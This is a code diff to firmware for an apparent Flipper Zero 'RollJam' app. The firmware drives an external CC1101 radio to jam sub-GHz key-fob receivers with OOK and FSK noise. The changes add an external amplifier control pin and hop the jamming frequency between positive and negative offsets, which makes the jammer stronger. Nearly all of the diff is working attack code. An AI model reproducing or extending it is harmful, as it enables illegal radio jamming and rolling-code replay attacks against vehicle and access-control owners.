@@ -35,6 +35,7 @@ static const GpioPin* pin_miso = &gpio_ext_pa6;
 static const GpioPin* pin_cs   = &gpio_ext_pa4;
 static const GpioPin* pin_sck  = &gpio_ext_pb3;
 static const GpioPin* pin_gdo0 = &gpio_ext_pb2;
+static const GpioPin* pin_amp  = &gpio_ext_pc3;
 
 // ============================================================
 // CC1101 Registers
@@ -226,49 +227,12 @@ static void cc_set_freq(uint32_t f) {
     cc_write(CC_FREQ0, r & 0xFF);
 }
 
-// ============================================================
-// JAMMING APPROACH: Random OOK noise via FIFO
-// ============================================================
-/*
- * Previous approaches and their problems:
- *
- * 1. FIFO random data (first attempt):
- *    - 100% underflow because data rate was too high
- *    
- * 2. Broadband GDO0 toggling:
- *    - Self-interference with internal CC1101
- *
- * 3. Pure CW carrier:
- *    - Too weak/narrow to jam effectively
- *
- * NEW APPROACH: Low data rate FIFO feeding
- *
- * Key insight: the underflow happened because data rate was
- * 115 kBaud and we couldn't feed the FIFO fast enough from
- * the thread (furi_delay + SPI overhead).
- *
- * Solution: Use LOW data rate (~1.2 kBaud) so the FIFO
- * drains very slowly. 64 bytes at 1.2 kBaud lasts ~426ms!
- * That's plenty of time to refill.
- *
- * At 1.2 kBaud with random data, the OOK signal creates
- * random on/off keying with ~833us per bit. This produces
- * a modulated signal with ~1.2kHz bandwidth - enough to
- * disrupt OOK receivers but narrow enough to not self-jam.
- *
- * Combined with the 700kHz offset, this is:
- * - Visible on spectrum analyzers (modulated signal)
- * - Effective at disrupting victim receivers
- * - NOT interfering with our narrow 58kHz RX
- */
-
 static bool cc_configure_jam(uint32_t freq) {
     FURI_LOG_I(TAG, "EXT: Config OOK noise jam at %lu Hz", freq);
     cc_idle();
 
-    // GDO0: TX FIFO threshold
-    cc_write(CC_IOCFG0, 0x02);  // GDO0 asserts when TX FIFO below threshold
-    cc_write(CC_IOCFG2, 0x0E);  // Carrier sense
+    cc_write(CC_IOCFG0, 0x02);
+    cc_write(CC_IOCFG2, 0x2F);
 
     // Fixed packet length, 255 bytes per packet
     cc_write(CC_PKTCTRL0, 0x00); // Fixed length, no CRC, no whitening
@@ -352,7 +316,7 @@ static bool cc_configure_jam_fsk(uint32_t freq, bool wide) {
     cc_idle();
 
     cc_write(CC_IOCFG0,   0x02);
-    cc_write(CC_IOCFG2,   0x0E);
+    cc_write(CC_IOCFG2,   0x2F);
     cc_write(CC_PKTCTRL0, 0x00);
     cc_write(CC_PKTCTRL1, 0x00);
     cc_write(CC_PKTLEN,   0xFF);
@@ -406,13 +370,24 @@ static bool cc_configure_jam_fsk(uint32_t freq, bool wide) {
 // Jam thread - FIFO-fed OOK at low data rate
 // ============================================================
 
+static void jam_start_tx(const uint8_t* pattern, uint8_t len) {
+    cc_strobe(CC_SFTX);
+    furi_delay_ms(1);
+    cc_write_burst(CC_TXFIFO, pattern, len);
+    cc_strobe(CC_STX);
+    furi_delay_ms(5);
+}
+
 static int32_t jam_thread_worker(void* context) {
     RollJamApp* app = context;
 
+    bool is_fsk = (app->mod_index == ModIndex_FM238 || app->mod_index == ModIndex_FM476);
+    uint32_t jam_freq_pos = app->frequency + app->jam_offset_hz;
+    uint32_t jam_freq_neg = app->frequency - app->jam_offset_hz;
+
     FURI_LOG_I(TAG, "========================================");
-    FURI_LOG_I(TAG, "JAM: LOW-RATE OOK NOISE MODE");
-    FURI_LOG_I(TAG, "Target: %lu  Jam: %lu (+%lu)",
-               app->frequency, app->jam_frequency, (uint32_t)JAM_OFFSET_HZ);
+    FURI_LOG_I(TAG, "JAM: Target=%lu Offset=%lu FSK=%d",
+               app->frequency, app->jam_offset_hz, is_fsk);
     FURI_LOG_I(TAG, "========================================");
 
     if(!cc_reset()) {
@@ -423,24 +398,20 @@ static int32_t jam_thread_worker(void* context) {
         FURI_LOG_E(TAG, "JAM: No chip!");
         return -1;
     }
+
     bool jam_ok = false;
     if(app->mod_index == ModIndex_FM238) {
-        FURI_LOG_I(TAG, "JAM: FSK mode FM238");
-        jam_ok = cc_configure_jam_fsk(app->jam_frequency, false);
+        jam_ok = cc_configure_jam_fsk(jam_freq_pos, false);
     } else if(app->mod_index == ModIndex_FM476) {
-        FURI_LOG_I(TAG, "JAM: FSK mode FM476");
-        jam_ok = cc_configure_jam_fsk(app->jam_frequency, true);
+        jam_ok = cc_configure_jam_fsk(jam_freq_pos, true);
     } else {
-        FURI_LOG_I(TAG, "JAM: OOK mode");
-        jam_ok = cc_configure_jam(app->jam_frequency);
+        jam_ok = cc_configure_jam(jam_freq_pos);
     }
     if(!jam_ok) {
         FURI_LOG_E(TAG, "JAM: Config failed!");
         return -1;
     }
 
-    // Fixed pattern: alternating 0xAA/0x55 — uniform amplitude,
-    // detectable by rolljam_is_jammer_pattern() on the RX side
     static const uint8_t noise_pattern[62] = {
         0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,
         0xAA,0x55,0xAA,0x55,0xAA,0x55,0xAA,0x55,
@@ -452,89 +423,77 @@ static int32_t jam_thread_worker(void* context) {
         0xAA,0x55
     };
 
-    // Flush TX FIFO
-    cc_strobe(CC_SFTX);
-    furi_delay_ms(1);
-
-    // Pre-fill FIFO with fixed pattern
-    cc_write_burst(CC_TXFIFO, noise_pattern, 62);
-
-    uint8_t txb = cc_txbytes();
-    FURI_LOG_I(TAG, "JAM: FIFO pre-filled, txbytes=%d", txb);
-
-    // Enter TX
-    cc_strobe(CC_STX);
-    furi_delay_ms(5);
+    furi_hal_gpio_write(pin_amp, true);
+    jam_start_tx(noise_pattern, 62);
 
     uint8_t st = cc_state();
-    FURI_LOG_I(TAG, "JAM: After STX state=0x%02X", st);
-
     if(st != MARC_TX) {
-        // Retry
         cc_idle();
-        cc_strobe(CC_SFTX);
-        furi_delay_ms(1);
-        cc_write_burst(CC_TXFIFO, noise_pattern, 62);
-        cc_strobe(CC_STX);
-        furi_delay_ms(5);
+        jam_start_tx(noise_pattern, 62);
         st = cc_state();
-        FURI_LOG_I(TAG, "JAM: Retry state=0x%02X", st);
         if(st != MARC_TX) {
+            furi_hal_gpio_write(pin_amp, false);
             FURI_LOG_E(TAG, "JAM: Cannot enter TX!");
             return -1;
         }
     }
 
-    FURI_LOG_I(TAG, "JAM: *** OOK NOISE ACTIVE ***");
+    FURI_LOG_I(TAG, "JAM: *** ACTIVE ***");
 
     uint32_t loops = 0;
     uint32_t underflows = 0;
     uint32_t refills = 0;
+    bool on_positive_offset = true;
 
     while(app->jam_thread_running) {
         loops++;
 
-        st = cc_state();
-
-        if(st != MARC_TX) {
-            // Packet finished or underflow - reload and re-enter TX
-            underflows++;
-
+        if(is_fsk && (loops % 4 == 0)) {
             cc_idle();
             cc_strobe(CC_SFTX);
             furi_delay_us(100);
 
-            // Refill with fixed pattern
-            cc_write_burst(CC_TXFIFO, noise_pattern, 62);
+            on_positive_offset = !on_positive_offset;
+            cc_set_freq(on_positive_offset ? jam_freq_pos : jam_freq_neg);
 
+            cc_write_burst(CC_TXFIFO, noise_pattern, 62);
             cc_strobe(CC_STX);
             furi_delay_ms(1);
             continue;
         }
 
-        // Check if FIFO needs refilling
-        txb = cc_txbytes();
+        st = cc_state();
+
+        if(st != MARC_TX) {
+            underflows++;
+            cc_idle();
+            cc_strobe(CC_SFTX);
+            furi_delay_us(100);
+            cc_write_burst(CC_TXFIFO, noise_pattern, 62);
+            cc_strobe(CC_STX);
+            furi_delay_ms(1);
+            continue;
+        }
+
+        uint8_t txb = cc_txbytes();
         if(txb < 20) {
-            // Refill what we can
             uint8_t space = 62 - txb;
             if(space > 50) space = 50;
-
             cc_write_burst(CC_TXFIFO, noise_pattern, space);
             refills++;
         }
 
-        // Log periodically
         if(loops % 500 == 0) {
-            FURI_LOG_I(TAG, "JAM: active loops=%lu uf=%lu refills=%lu txb=%d st=0x%02X",
-                       loops, underflows, refills, cc_txbytes(), cc_state());
+            FURI_LOG_I(TAG, "JAM: loops=%lu uf=%lu refills=%lu txb=%d",
+                       loops, underflows, refills, cc_txbytes());
         }
 
-        // At 1.2 kBaud, 62 bytes last ~413ms
-        // Check every 50ms - plenty of time
         furi_delay_ms(50);
     }
 
     cc_idle();
+    furi_hal_gpio_write(pin_amp, false);
+    cc_write(CC_IOCFG2, 0x2E);
     FURI_LOG_I(TAG, "JAM: STOPPED (loops=%lu uf=%lu refills=%lu)", loops, underflows, refills);
     return 0;
 }
@@ -553,9 +512,13 @@ void rolljam_ext_gpio_init(void) {
     furi_hal_gpio_write(pin_mosi, false);
     furi_hal_gpio_init(pin_miso, GpioModeInput, GpioPullUp, GpioSpeedVeryHigh);
     furi_hal_gpio_init(pin_gdo0, GpioModeInput, GpioPullDown, GpioSpeedVeryHigh);
+    furi_hal_gpio_init_simple(pin_amp, GpioModeOutputPushPull);
+    furi_hal_gpio_write(pin_amp, false);
 }
 
 void rolljam_ext_gpio_deinit(void) {
+    furi_hal_gpio_write(pin_amp, false);
+    furi_hal_gpio_init_simple(pin_amp, GpioModeAnalog);
     furi_hal_gpio_init(pin_cs, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
     furi_hal_gpio_init(pin_sck, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
     furi_hal_gpio_init(pin_mosi, GpioModeAnalog, GpioPullNo, GpioSpeedLow);
@@ -570,7 +533,7 @@ void rolljam_ext_gpio_deinit(void) {
 
 void rolljam_jammer_start(RollJamApp* app) {
     if(app->jamming_active) return;
-    app->jam_frequency = app->frequency + JAM_OFFSET_HZ;
+    app->jam_frequency = app->frequency + app->jam_offset_hz;
     rolljam_ext_power_on();
     furi_delay_ms(100);
     rolljam_ext_gpio_init();
